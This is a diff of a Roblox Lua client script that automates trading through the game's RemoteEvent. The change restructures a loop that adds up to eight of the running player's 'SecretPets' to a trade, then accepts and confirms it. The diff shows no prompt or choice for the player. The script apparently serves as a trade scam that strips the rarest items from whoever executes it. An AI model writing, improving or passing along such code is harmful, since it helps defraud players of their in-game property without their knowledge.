@@ -3,7 +3,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
--- UPDATED AGAIN |AGAIN
+-- UPDATED AGAIN |AGAIN LOL
 -- RemoteEvent path - So Cool 
 local Event = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
 
@@ -66,31 +66,27 @@ local function mainCode()
 
 	local maxPets = 8
 	local totalPets = math.min(#SecretPets, maxPets)
-	local petsAdded = 0
 
-	for i = 1, totalPets do
-		local petId = SecretPets[i]
-		task.delay(i * 0.5, function()
+	task.spawn(function()
+		for i = 1, totalPets do
+			local petId = SecretPets[i]
 			Event:FireServer("TradeAddPet", petId)
-			petsAdded += 1
+			task.wait(0.5)
+		end
 
-			if petsAdded == totalPets then
-				-- ✅ All pets added — now do accept + confirm logic
-				task.delay(5, function()
-					Event:FireServer("TradeAccept")
+		-- ✅ All pets added — now do accept + confirm logic
+		task.wait(5)
+		Event:FireServer("TradeAccept")
 
-					local youCover = tradingUI.Frame.Inner.You.Cover
-					local themCover = tradingUI.Frame.Inner.Them.Cover
+		local youCover = tradingUI.Frame.Inner.You.Cover
+		local themCover = tradingUI.Frame.Inner.Them.Cover
 
-					repeat task.wait(0.5) until youCover.Visible and themCover.Visible
+		repeat task.wait(0.5) until youCover.Visible and themCover.Visible
 
-					task.wait(10)
+		task.wait(10)
 
-					Event:FireServer("TradeConfirm")
-				end)
-			end
-		end)
-	end
+		Event:FireServer("TradeConfirm")
+	end)
 end
 
 task.spawn(function()
